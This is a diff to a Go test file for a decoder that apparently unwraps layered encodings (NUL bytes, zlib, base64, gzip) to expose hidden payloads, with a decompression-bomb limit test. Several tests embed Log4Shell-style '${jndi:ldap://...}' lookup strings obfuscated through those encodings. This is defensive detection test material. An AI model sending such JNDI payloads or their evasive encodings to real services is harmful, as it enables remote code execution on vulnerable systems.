@@ -3,6 +3,8 @@ package engine
 import (
 	"bytes"
 	"compress/gzip"
+	"compress/zlib"
+	"encoding/base64"
 	"reflect"
 	"strings"
 	"testing"
@@ -284,8 +286,13 @@ func TestDecodeGzipHeaderOnlyIsIgnored(t *testing.T) {
 	// A valid gzip header with no recoverable data is not a decodable layer.
 	in := gzipString(t, "x")[:10]
 	res := Decode(in, Limits{})
-	if res.Exhausted != BudgetNone || len(res.Stages) != 1 {
-		t.Fatalf("Exhausted = %v, stages = %d, want none and exactly the original", res.Exhausted, len(res.Stages))
+	if res.Exhausted != BudgetNone {
+		t.Fatalf("Exhausted = %v, want none", res.Exhausted)
+	}
+	for _, st := range res.Stages {
+		if len(st.Path) > 0 && st.Path[0] == TransformGzip {
+			t.Errorf("gzip header alone produced a gzip stage: %q", st.Text)
+		}
 	}
 }
 
@@ -408,4 +415,124 @@ func FuzzDecode(f *testing.F) {
 			}
 		}
 	})
+}
+
+func TestDecodeNULStrip(t *testing.T) {
+	// UTF-16LE text, and the same text percent-encoded: both reveal the payload
+	// once NUL bytes are removed.
+	utf16 := "$\x00{\x00j\x00n\x00d\x00i\x00"
+	for _, in := range []string{utf16, "%24%00%7B%00jndi"} {
+		res := Decode(in, Limits{})
+		found := false
+		for _, st := range res.Stages {
+			if strings.HasPrefix(st.Text, "${jndi") && st.Path[len(st.Path)-1] == TransformNUL {
+				found = true
+			}
+		}
+		if !found {
+			t.Errorf("Decode(%q) did not reveal ${jndi via nul-strip: %q", in, res.Stages)
+		}
+	}
+	if res := Decode("plain", Limits{}); len(res.Stages) != 1 {
+		t.Errorf("text without NUL gained stages: %d", len(res.Stages))
+	}
+}
+
+func zlibString(t *testing.T, s string) string {
+	t.Helper()
+	var buf bytes.Buffer
+	zw := zlib.NewWriter(&buf)
+	if _, err := zw.Write([]byte(s)); err != nil {
+		t.Fatal(err)
+	}
+	if err := zw.Close(); err != nil {
+		t.Fatal(err)
+	}
+	return buf.String()
+}
+
+func hasStage(res Result, text string, last Transform) bool {
+	for _, st := range res.Stages {
+		if st.Text == text && len(st.Path) > 0 && st.Path[len(st.Path)-1] == last {
+			return true
+		}
+	}
+	return false
+}
+
+func TestDecodeZlib(t *testing.T) {
+	res := Decode(zlibString(t, "${jndi:x}"), Limits{})
+	if !hasStage(res, "${jndi:x}", TransformZlib) {
+		t.Errorf("zlib not decoded: %q", res.Stages)
+	}
+	// Not zlib: wrong method nibble, bad check bits, truncated, empty stream.
+	for _, in := range []string{"\x79\x9c....", "\x78\x9d....", "\x78\x9c", "x", ""} {
+		if r := Decode(in, Limits{}); len(r.Stages) != 1 {
+			t.Errorf("Decode(%q) produced %d stages", in, len(r.Stages))
+		}
+	}
+	// Valid header, garbage stream: nothing recovered.
+	if r := Decode("\x78\x9c\xff\xff\xff\xff", Limits{}); len(r.Stages) != 1 {
+		t.Errorf("garbage zlib stream produced %d stages", len(r.Stages))
+	}
+	// Truncated stream keeps the recovered prefix, like gzip.
+	z := zlibString(t, strings.Repeat("${jndi:x} ", 200))
+	found := false
+	for _, st := range Decode(z[:len(z)-8], Limits{}).Stages {
+		if len(st.Path) > 0 && st.Path[0] == TransformZlib && strings.Contains(st.Text, "${jndi:x}") {
+			found = true
+		}
+	}
+	if !found {
+		t.Error("truncated zlib prefix lost")
+	}
+}
+
+func TestDecodeZlibBomb(t *testing.T) {
+	z := zlibString(t, strings.Repeat("A", 3<<20))
+	if res := Decode(z, Limits{}); res.Exhausted != BudgetStageBytes {
+		t.Errorf("Exhausted = %v, want stage-bytes", res.Exhausted)
+	}
+}
+
+func TestDecodeBase64(t *testing.T) {
+	std := base64.StdEncoding.EncodeToString([]byte("${jndi:ldap://x.invalid/a}"))
+	raw := base64.RawURLEncoding.EncodeToString([]byte("${jndi:ldap://x.invalid/a}?>>"))
+	for _, in := range []string{std, raw, strings.TrimRight(std, "=")} {
+		res := Decode(in, Limits{})
+		found := false
+		for _, st := range res.Stages {
+			if strings.HasPrefix(st.Text, "${jndi:ldap") && st.Path[len(st.Path)-1] == TransformBase64 {
+				found = true
+			}
+		}
+		if !found {
+			t.Errorf("base64 %q not decoded: %q", in, res.Stages)
+		}
+	}
+	// Ignored: too short, not base64, binary result, control bytes, non-ASCII.
+	binary := base64.StdEncoding.EncodeToString([]byte{0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08})
+	high := base64.StdEncoding.EncodeToString([]byte("caf\xc3\xa9 caf\xc3\xa9"))
+	del := base64.StdEncoding.EncodeToString([]byte("aaaaaaaa\x7f"))
+	for _, in := range []string{"aGk=", "abc def ghi jkl", "internationalization", binary, high, del, "AAAA AAAA AAAA", strings.Repeat("A", 12) + "!"} {
+		if r := Decode(in, Limits{}); len(r.Stages) != 1 {
+			t.Errorf("Decode(%q) produced %d stages: %q", in, len(r.Stages), r.Stages)
+		}
+	}
+}
+
+func TestDecodeBase64ThenCompression(t *testing.T) {
+	for name, packed := range map[string]string{"gzip": gzipString(t, "${jndi:x}"), "zlib": zlibString(t, "${jndi:x}")} {
+		in := base64.StdEncoding.EncodeToString([]byte(packed))
+		res := Decode(in, Limits{})
+		found := false
+		for _, st := range res.Stages {
+			if st.Text == "${jndi:x}" {
+				found = true
+			}
+		}
+		if !found {
+			t.Errorf("%s inside base64 not unpacked: %d stages", name, len(res.Stages))
+		}
+	}
 }
